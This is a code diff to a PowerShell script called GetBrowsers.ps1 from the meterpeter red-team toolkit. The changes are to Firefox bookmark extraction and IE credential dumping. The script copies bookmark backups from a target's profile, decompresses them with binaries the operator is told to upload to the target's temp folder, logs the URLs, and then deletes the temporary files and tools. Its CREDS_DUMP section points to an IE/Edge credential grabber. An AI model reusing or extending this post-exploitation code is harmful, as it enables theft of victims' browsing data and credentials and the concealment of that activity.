@@ -4,7 +4,7 @@
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: IE, Firefox, Chrome
-  Optional Dependencies: None
+  Optional Dependencies: mozlz4-win32.exe , mozlz4-win64.exe
   PS Script Dev Version: v1.17
 
 .DESCRIPTION
@@ -15,7 +15,11 @@
 
 .NOTES
    PS C:\> Get-Help ./GetBrowsers.ps1 -full
-   Access This Cmdlet Comment-based Help
+   Access This Cmdlet Comment_based_Help
+
+   mozlz4-win32.exe , mozlz4-win64.exe
+   Used to convert firefox bookmarks files from: jsonlz4 To: json
+   Downloads: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1
@@ -456,34 +460,43 @@ function FIREFOX {
     }
 
     ## TODO: Retrieve FireFox bookmarks
+    # Need to test it on IEFP computer
     echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "-----------------" >> $LogFilePath\BrowserEnum.log
-    $AlternativeDir = $False
+    $IPATH = pwd;$AlternativeDir = $False
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release")){
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4"   
     }else{
         $AlternativeDir = $True
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\*.jsonlz4" 
     }
+
     If(-not(Test-Path -Path "$Bookmarks_Path")) {
         echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
     }else{
-        $IPATH = pwd
-        $LocalArch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
         If($AlternativeDir -eq $True){
+            ## Store 1º bookmark file into { $Final } local var
             cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\"
             $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\*"
+            $parse = $StorePath|Select-Object -ExpandProperty name
+            $Final = $parse[0]
+            ## Copy .Jsonlz4 file to $env:tmp directory
+            Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
+            $fail = $False;cd $env:tmp
         }else{
+            ## Store 1º bookmark file into { $Final } local var
             cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\"
-            $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*"        
+            $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*"
+            $parse = $StorePath|Select-Object -ExpandProperty name
+            $Final = $parse[0]
+            ## Copy .Jsonlz4 file to $env:tmp directory
+            Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
+            $fail = $False;cd $env:tmp
         }
-        $parse = $StorePath|Select-Object -ExpandProperty name
-        $Final = $parse[0]
-        ## Copy .Jsonlz4 file to $env:tmp directory
-        Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
-        $fail = $False;cd $env:tmp
+
+        $LocalArch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
         If($LocalArch -match "64"){
-            If(-not(Test-Path "mozlz4-win64.exe")){
+            If(-not(Test-Path "$env:tmp\mozlz4-win64.exe")){
                 $fail = $True
                 echo "{Upload: meterpeter\mimiRatz\mozlz4-win64.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
                 echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
@@ -494,11 +507,14 @@ function FIREFOX {
                 $SplitString = $DumpFileData.split(',')
                 $findUri = $SplitString|findstr /I /C:"uri"
                 $Deliconuri = $findUri|findstr /V /C:"iconuri"
-                $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}',''
+                $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}','' -replace ']',''
                 echo $ParsingData >> $LogFilePath\BrowserEnum.log
+                Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path "$env:tmp\mozlz4-win64.exe" -Force -ErrorAction SilentlyContinue
             }
         }else{
-            If(-not(Test-Path "mozlz4-win32.exe")){
+            If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
                 $fail = $True
                 echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
                 echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
@@ -509,11 +525,15 @@ function FIREFOX {
                 $SplitString = $DumpFileData.split(',')
                 $findUri = $SplitString|findstr /I /C:"uri"
                 $Deliconuri = $findUri|findstr /V /C:"iconuri"
-                $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}',''
+                $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}',''  -replace ']',''
                 echo $ParsingData >> $LogFilePath\BrowserEnum.log
+                Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path "$env:tmp\mozlz4-win32.exe" -Force -ErrorAction SilentlyContinue
             }
+            cd $IPATH
         }
-        cd $IPATH
+
         ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
         # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..
         If($fail -eq $True){
@@ -524,6 +544,7 @@ function FIREFOX {
                 }
             }
         }
+        cd $IPATH
 }
 
 
@@ -733,7 +754,7 @@ function ADDONS {
 
 
 function CREDS_DUMP {
-    ## TODO: Retrieve IE Credentials
+    ## Retrieve IE Credentials
     echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
     echo "`nhttps://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1" >> $LogFilePath\BrowserEnum.log
     echo "--------------------------------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
